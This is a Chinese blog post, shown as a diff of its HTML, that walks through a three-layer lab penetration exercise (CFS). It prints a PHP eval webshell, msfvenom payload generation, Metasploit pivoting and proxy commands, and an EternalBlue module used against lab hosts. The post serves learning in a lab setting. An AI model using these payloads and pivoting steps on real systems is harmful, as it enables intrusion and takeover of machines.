@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>CFS三层网络渗透 | mrfan6の博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="靶机环境Kaili（攻击机）： 此主机的IP地址： 192.168.1.11（外网） Centos: 此主机的IP地址： 192.168.1.128（外网） 192.168.22.128（内网） Ubuntu： 此主机的IP地址： 192.168.22.129（内网） 192.168.33.129（内网） Windows 此主机的IP地址： 192.168.33.33（内网）   Centos渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CFS三层网络渗透">
+<meta property="og:url" content="https://mrfan6.github.io/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/index.html">
+<meta property="og:site_name" content="mrfan6の博客">
+<meta property="og:description" content="靶机环境Kaili（攻击机）： 此主机的IP地址： 192.168.1.11（外网） Centos: 此主机的IP地址： 192.168.1.128（外网） 192.168.22.128（内网） Ubuntu： 此主机的IP地址： 192.168.22.129（内网） 192.168.33.129（内网） Windows 此主机的IP地址： 192.168.33.33（内网）   Centos渗透">
+<meta property="og:locale">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps533.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps544.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps545.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps546.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps547.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps548.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps549.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps54A.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps54B.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps54C.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps55D.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps55E.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps55F.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps560.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps561.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps562.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps563.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps564.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps565.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps575.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps576.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps577.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps578.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps579.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps57A.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps57B.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps58C.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps58D.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps58E.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps58F.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps590.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps591.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps592.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps593.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps594.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A4.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A5.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A6.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A7.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A8.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A9.tmp.jpg">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5AA.tmp.jpg">
+<meta property="article:published_time" content="2022-02-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-16T02:06:51.354Z">
+<meta property="article:author" content="mrfan6">
+<meta property="article:tag" content="靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps533.tmp.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="mrfan6の博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img src="../../../../../../../../../img/head.jpg" class="js-avatar show">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate"></a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="/HTML/index.html">火影忍者</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="#" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl QQ" target="_blank" href="#" title="QQ">QQ</a>
+                            
+                                <a class="fl wechat" target="_blank" href="#" title="wechat">wechat</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Web安全</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">编程</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 10px;">靶机</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://mrfan6.github.io/">mrfan6</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱运动、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>            
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="/HTML/index.html">火影忍者</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="#" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="QQ" target="_blank" href="#" title="QQ">QQ</a>
+                    
+                        <a class="wechat" target="_blank" href="#" title="wechat">wechat</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-CFS三层网络" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/" class="article-date">
+      <time datetime="2022-02-17T16:00:00.000Z" itemprop="datePublished">2022-02-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CFS三层网络渗透
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+	<div class="article-entry" itemprop="articleBody">
+	      
+	        
+	            
+	        
+	        
+	        <h1 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h1><p>Kaili（攻击机）：</p>
+<p>此主机的IP地址：</p>
+<p>192.168.1.11（外网）</p>
+<p>Centos:</p>
+<p>此主机的IP地址：</p>
+<p>192.168.1.128（外网）</p>
+<p>192.168.22.128（内网）</p>
+<p>Ubuntu：</p>
+<p>此主机的IP地址：</p>
+<p>192.168.22.129（内网）</p>
+<p>192.168.33.129（内网）</p>
+<p>Windows</p>
+<p>此主机的IP地址：</p>
+<p>192.168.33.33（内网）</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps533.tmp.jpg" alt="img"> </p>
+<h1 id="Centos渗透"><a href="#Centos渗透" class="headerlink" title="Centos渗透:"></a>Centos渗透:</h1><h2 id="①信息收集"><a href="#①信息收集" class="headerlink" title="①信息收集"></a>①信息收集</h2><p>先进行简单的端口扫描，观察是否存在未授权访问的相应端口，以及重要服务信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.128 -sV -T4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps544.tmp.jpg" alt="img"> </p>
+<p>通过搜集可以探测到192.168.1.3主机开启了21,22,80,111,888,3306,8888端口。</p>
+<h2 id="②漏洞探测"><a href="#②漏洞探测" class="headerlink" title="②漏洞探测"></a>②漏洞探测</h2><p>观察已经打开的端口80,网页, 查看相关页面内容为下一步攻击做好相应的信息收集, 从而能够更好的进行攻击。</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps545.tmp.jpg" alt="img"> </p>
+<p>打开发现是一个thinkphp v5框架开发的web网站。</p>
+<p>所以可以通过网上已经公布的相关漏洞进行尝试， 这里我用收集到的工具直接进行探测漏洞的存在</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps546.tmp.jpg" alt="img"> </p>
+<p>利用网上工具漏洞检测到了相关漏洞</p>
+<p>就以tp5_invoke_func_code_exec_1漏洞为例利用输出whoami命令</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps547.tmp.jpg" alt="img"> </p>
+<p>可以发现是存在该漏洞的，所以下一步可以写入shell让我们利用蚁剑或者菜刀进行连接。</p>
+<h2 id="③写入一句话木马"><a href="#③写入一句话木马" class="headerlink" title="③写入一句话木马"></a>③写入一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps548.tmp.jpg" alt="img"> </p>
+<p>此时已经写入成功该文件了，可以先进行简单的验证</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps549.tmp.jpg" alt="img"> </p>
+<p>可以发现此时已经确实上传且无任何拦截的，所以下一步就进行连接</p>
+<h2 id="④蚁剑连接"><a href="#④蚁剑连接" class="headerlink" title="④蚁剑连接"></a>④蚁剑连接</h2><p>通过蚁剑工具进行连接</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps54A.tmp.jpg" alt="img"><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps54B.tmp.jpg" alt="img"> </p>
+<h2 id="⑤将会话反弹到MSF中"><a href="#⑤将会话反弹到MSF中" class="headerlink" title="⑤将会话反弹到MSF中"></a>⑤将会话反弹到MSF中</h2><p>利用MSF生成木马Linux可执行文件root.elf文件</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps54C.tmp.jpg" alt="img"> </p>
+<p>将root.elf木马文件上传到服务器</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps55D.tmp.jpg" alt="img"> </p>
+<p>MSF kali进行监听端口</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps55E.tmp.jpg" alt="img"> </p>
+<p>在服务器上执行root.elf后可以观察已经成功反弹到MSF会话中了 这样已经基本上完成了一个简单的渗透前期过程了。</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps55F.tmp.jpg" alt="img"> </p>
+<h1 id="Ubuntu渗透："><a href="#Ubuntu渗透：" class="headerlink" title="Ubuntu渗透："></a>Ubuntu渗透：</h1><p>由于Ubuntu主机的网络都是内网中，要想直接拿shell是不可能的，所以这里就需要借助sock开启代理(此时已经拿到了Centos web的shell了,从而进行流量的转发)。</p>
+<h2 id="①利用上个主机反弹到MSF会话中继续网段探针"><a href="#①利用上个主机反弹到MSF会话中继续网段探针" class="headerlink" title="①利用上个主机反弹到MSF会话中继续网段探针"></a>①利用上个主机反弹到MSF会话中继续网段探针</h2><p>通过网卡可以发现该主机还存在另一个内网网段 所以可以从该网段探针</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps560.tmp.jpg" alt="img"> </p>
+<p>要想直接访问192.168.22/24就要先知道当前主机是否有该网段的路由信息，有就能与其网段进行探针，没有就要添加路由信息了</p>
+<h2 id="②网段添加与查看"><a href="#②网段添加与查看" class="headerlink" title="②网段添加与查看"></a>②网段添加与查看</h2><p>查看当前服务器的路由信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps561.tmp.jpg" alt="img"> </p>
+<p>可以发现并没有路由 所以要加入192.168.22.0/24的网段</p>
+<p>添加路由地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps562.tmp.jpg" alt="img"> </p>
+<p>通过命令可以发现该网段已经加入完成了</p>
+<h2 id="③sock代理开启"><a href="#③sock代理开启" class="headerlink" title="③sock代理开启"></a>③sock代理开启</h2><p>由于当前kali与192.168.22.0/24并不能互通,因为它是web服务器里的一个内网网段, 是无法与外界访问的, 所以这里需要借助代理进行横向渗透</p>
+<p>开启本地代理（在当前MSF窗口执行）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks/proxy</span><br><span class="line"></span><br><span class="line">set srvport 3333</span><br><span class="line"></span><br><span class="line">use version 4a</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps563.tmp.jpg" alt="img"> </p>
+<p>修改/etc/proxychains4 .conf的ip地址为当前kali的ip，端口与前面配置的一致</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps564.tmp.jpg" alt="img"> </p>
+<h2 id="④利用代理进行扫描"><a href="#④利用代理进行扫描" class="headerlink" title="④利用代理进行扫描"></a>④利用代理进行扫描</h2><p>利用跳版去扫描192.168.22.0/24网段 获取其它在线IP</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80</span><br></pre></td></tr></table></figure>
+
+<p>socks4的代理，只能使用tcp协议，所以nmap使用的时候要使用-sT选择<em>使用tcp_协议，要使用-Pn</em>不使用ICMP_的ping确认主机存活</p>
+<p>-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</p>
+<p>-sT：扫描 TCP 数据包已建立的连接 connect</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps565.tmp.jpg" alt="img"> </p>
+<p>通过扫描发现192.168.22.129存在开启了80端口,其它网段暂无80</p>
+<h2 id="④利用代理访问"><a href="#④利用代理访问" class="headerlink" title="④利用代理访问"></a>④利用代理访问</h2><p>若不通过代理的话, kali是无法直接访问192.168.22.129的web页面的，因为192.168.22.129属于一个内网网段并不能出外网访问</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps575.tmp.jpg" alt="img"> </p>
+<p>所以要利用前面配置的代理功能进行访问</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps576.tmp.jpg" alt="img"> </p>
+<p>配置完后再进行访问就可以发现已经直接可以访问成功了</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps577.tmp.jpg" alt="img"> </p>
+<p>成功访问 继续相关漏洞检测 通过页面源码可以发现已经告诉漏洞所在</p>
+<p>是一个漏洞注入的漏洞</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps578.tmp.jpg" alt="img"> </p>
+<h2 id="⑤web漏洞检测与利用"><a href="#⑤web漏洞检测与利用" class="headerlink" title="⑤web漏洞检测与利用"></a>⑤web漏洞检测与利用</h2><p>进行漏洞检测</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps579.tmp.jpg" alt="img"> </p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps57A.tmp.jpg" alt="img"> </p>
+<p>通过对比可以发现存在sql单引号注入的漏洞 所以直接丢sqlmap</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps57B.tmp.jpg" alt="img"> </p>
+<p>通过一系列的操作后就可以，直接爆出了admin—–123qwe管理员的账户与密码</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps58C.tmp.jpg" alt="img"> </p>
+<h2 id="⑥后台写入一句话"><a href="#⑥后台写入一句话" class="headerlink" title="⑥后台写入一句话"></a>⑥后台写入一句话</h2><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps58D.tmp.jpg" alt="img"> </p>
+<p>进入后台后点击相应的模板 添加一句话</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps58E.tmp.jpg" alt="img"> </p>
+<p>该模板的url在 <a target="_blank" rel="noopener" href="http://192.168.22.129/index.php?r=tag">http://192.168.22.129/index.php?r=tag</a></p>
+<p>蚁剑连接进行连接（需要借助sock代理）</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps58F.tmp.jpg" alt="img"> </p>
+<h2 id="⑦将会话反弹到MSF中"><a href="#⑦将会话反弹到MSF中" class="headerlink" title="⑦将会话反弹到MSF中"></a>⑦将会话反弹到MSF中</h2><p>制作shell反弹到MSF会话中</p>
+<p>由于此时Ubuntu主机是跨网段的所以这里就需要使用正向连接, 因为Ubuntu主机是无法直接访问攻击机的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=9999 -f elf &gt; bind.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps590.tmp.jpg" alt="img"> </p>
+<p>Kaili开启监听</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps591.tmp.jpg" alt="img"> </p>
+<p>上传到Ubuntu主机中</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps592.tmp.jpg" alt="img"> </p>
+<p>启动该执行脚本</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps593.tmp.jpg" alt="img"> </p>
+<p>这就已经拿到该Ubuntu主机的权限了</p>
+<h1 id="Windows渗透"><a href="#Windows渗透" class="headerlink" title="Windows渗透"></a>Windows渗透</h1><h2 id="①利用上个主机反弹到MSF会话中继续网段探针-1"><a href="#①利用上个主机反弹到MSF会话中继续网段探针-1" class="headerlink" title="①利用上个主机反弹到MSF会话中继续网段探针"></a>①利用上个主机反弹到MSF会话中继续网段探针</h2><p>通过ifconfig可以发现还有一个网段存在 所以继续探针下去</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps594.tmp.jpg" alt="img"> </p>
+<h2 id="②网段添加与查看-1"><a href="#②网段添加与查看-1" class="headerlink" title="②网段添加与查看"></a>②网段添加与查看</h2><p>添加网段192.168.33.129</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A4.tmp.jpg" alt="img"> </p>
+<h2 id="③sock代理开启-1"><a href="#③sock代理开启-1" class="headerlink" title="③sock代理开启"></a>③sock代理开启</h2><p>添加sock代理</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A5.tmp.jpg" alt="img"> </p>
+<p>（不下心把第一个的socks4改成了socks5，但为了不必要的麻烦所以我统一都改成了socks5）</p>
+<p>配置/etc/proxychains4.conf文件</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A6.tmp.jpg" alt="img"> </p>
+<h2 id="④利用代理进行扫描-1"><a href="#④利用代理进行扫描-1" class="headerlink" title="④利用代理进行扫描"></a>④利用代理进行扫描</h2><p>扫描192.168.33.0/24当前网段存在的ip信息</p>
+<p>可以使用MSF中的模块如：<strong>auxiliary/scanner/portscan/tcp</strong> 模块进行扫描</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A7.tmp.jpg" alt="img"> </p>
+<p>可以发现存在192.1688.33.33主机</p>
+<p>接着再使用nmap定向扫描该主机所开启的端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -T4 192.168.33.33 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A8.tmp.jpg" alt="img">通过结果可以发现存在135,445,3389端口疑似windows主机</p>
+<h2 id="⑤直接尝试漏洞是否存在"><a href="#⑤直接尝试漏洞是否存在" class="headerlink" title="⑤直接尝试漏洞是否存在"></a>⑤直接尝试漏洞是否存在</h2><p>此时直接上永恒之蓝验证，开启了135,445端口所以可以尝试一般，因为相对来说拿权限更快</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5A9.tmp.jpg" alt="img"> </p>
+<p>最后直接获取到该主机权限了，而且还是最高权限system。</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/wps5AA.tmp.jpg" alt="img"> </p>
+<p>此时主机只有一个网段 所以整个网络渗透完毕。</p>
+
+	        
+	      
+	    </div>
+	    
+	  </div>
+	  
+	    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/">CFS三层网络渗透</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2022年02月18日 - 00时00分</p>
+        <p><span>最后更新:</span>2022年08月16日 - 10时06分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/" title="CFS三层网络渗透">https://mrfan6.github.io/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://mrfan6.github.io/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
